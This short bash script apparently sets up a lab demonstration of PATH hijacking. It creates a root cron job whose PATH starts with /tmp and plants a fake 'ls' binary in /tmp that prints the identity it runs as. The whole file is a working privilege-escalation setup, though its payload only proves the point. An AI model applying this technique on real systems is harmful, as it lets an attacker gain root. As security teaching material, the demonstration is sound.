#!/bin/bash
# BREAK: PATH hijack via /tmp targeting root cron job
# A malicious binary in /tmp executes as root when cron runs

# Step 1 — create the vulnerable cron job
crontab - << 'EOF'
* * * * * PATH=/tmp:/usr/bin:/bin /usr/local/bin/cleanup.sh >> /tmp/cron-output.txt 2>&1
EOF

# Step 2 — create the script cron will call
cat > /usr/local/bin/cleanup.sh << 'EOF'
#!/bin/bash
ls /tmp
EOF
chmod +x /usr/local/bin/cleanup.sh

# Step 3 — plant malicious binary in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
echo "[PWNED] running as: $(whoami) PID: $$"
echo "[PWNED] $(id)"
/usr/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Step 4 — start cron
service cron start

echo "[BREAK] planted. wait 60 seconds then: cat /tmp/cron-output.txt"
